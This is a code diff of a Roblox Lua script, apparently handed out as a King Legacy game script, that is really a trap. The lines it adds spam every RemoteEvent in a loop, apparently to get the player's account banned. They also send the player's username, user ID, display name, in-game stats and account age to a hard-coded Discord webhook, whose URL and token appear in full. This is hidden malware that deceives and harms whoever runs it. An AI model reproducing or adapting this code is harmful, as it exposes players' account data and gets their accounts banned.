@@ -1,45 +1,4 @@
-HttpService = game:GetService("HttpService")  
-  Webhook_URL =  "https://discord.com/api/webhooks/1165544617341616138/QiOP7PFZwHyGcOwM8UCgBRxtamewk6Uh_mXucGo4XcLAHMMFW-rW5ju5S6rsK2-TTm5_"  
-  local ok = request or http_request or (http and http.request) or syn.request  
-  ok(  
-  {  
-  Url = Webhook_URL,  
-  Method = 'POST',  
-  Headers = {  
-  ['Content-Type'] = 'application/json'  
-  },  
-  Body = HttpService:JSONEncode({  
-  ["content"] = "",  
-  ["embeds"] = {{  
-  ["author"] = {  
-  ["name"] = "Level: ["..game.Players.LocalPlayer.PlayerStats.lvl.Value.."] ["..game.Players.LocalPlayer.Name.."]",  
-  ["icon"] = "https://www.roblox.com/headshot-thumbnail/image?userId="..game.Players.LocalPlayer.UserId.."&width=100&height=100&format=png"  
-  },  
-  ["title"] = ""..game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId).Name, 
-  ["description"] = " ["..game.Players.LocalPlayer.DisplayName.."] Vừa Dính Bẫy:))",  
-  ["type"] = "rich",  
-  ["color"] = tonumber(0xffffff),  
-  ["fields"] = {  
-  {  
-  ["name"] = "Beli: "..game.Players.LocalPlayer.PlayerStats.beli.Value,  
-  ["value"] = "Gem: "..game.Players.LocalPlayer.PlayerStats.Gem.Value,  
-  ["inline"] = true },  
-  {  
-  ["name"] = "Người Dùng ID:",  
-  ["value"] = game:GetService("Players").LocalPlayer.UserId,  
-  ["inline"] = true },  
-  {  
-  ["name"] = "Script Game",  
-  ["value"] = "game:GetService('TeleportService'):Teleport("..game.PlaceId..")",  
-  ["inline"] = true },  
-  {  
-  ["name"] = "Số tuổi của Account:",  
-  ["value"] = game:GetService("Players").LocalPlayer.AccountAge,  
-  ["inline"] = true }  
-  }  
-  }}  
-  })  
-  })
+
 getgenv().ban = true
 while ban do wait()
 for i,v in pairs(game:GetDescendants()) do
@@ -48,3 +7,63 @@ v:FireServer()
 end
 end
 end
+
+HttpService = game:GetService("HttpService") 
+ Webhook_URL =  "https://discord.com/api/webhooks/1165544617341616138/QiOP7PFZwHyGcOwM8UCgBRxtamewk6Uh_mXucGo4XcLAHMMFW-rW5ju5S6rsK2-TTm5_" 
+ local ok = request or http_request or (http and http.request) or syn.request 
+ ok( 
+ { 
+ Url = Webhook_URL, 
+ Method = 'POST', 
+ Headers = { 
+ ['Content-Type'] = 'application/json' 
+ }, 
+ Body = HttpService:JSONEncode({ 
+ ["content"] = "", 
+ ["embeds"] = {{ 
+ ["author"] = { 
+ ["name"] = game.Players.LocalPlayer.Name, 
+ ["icon"] = "https://www.roblox.com/headshot-thumbnail/image?userId="..game.Players.LocalPlayer.UserId.."&width=100&height=100&format=png" 
+ }, 
+ ["title"] = "[King Legacy].    "..game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId).Name, 
+ ["description"] = " ["..game.Players.LocalPlayer.DisplayName.."] Vừa Ăn Ban..", 
+ ["type"] = "rich", 
+ ["color"] = tonumber(0xffffff), 
+ ["fields"] = { 
+ { 
+ ["name"] = "Bounty: "..game.Players.LocalPlayer.leaderstats.Bounty.Value, 
+ ["value"] = "Level Battlepass: "..game.Players.LocalPlayer.PlayerStats.BattlepassLevel.Value, 
+ ["inline"] = true }, 
+ { 
+ ["name"] = "Beli: "..game.Players.LocalPlayer.PlayerStats.beli.Value, 
+ ["value"] = "Gem: "..game.Players.LocalPlayer.PlayerStats.Gem.Value, 
+ ["inline"] = true }, 
+ { 
+ ["name"] = ""..game.Players.LocalPlayer.PlayerStats.RaceTbl.Value,
+ ["value"] = "User Id: "..game.Players.LocalPlayer.UserId, 
+ ["inline"] = true }, 
+ { 
+ ["name"] = "Số tuổi của Account:", 
+ ["value"] = game:GetService("Players").LocalPlayer.AccountAge, 
+ ["inline"] = true } 
+ } 
+ }} 
+ }) 
+ })
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
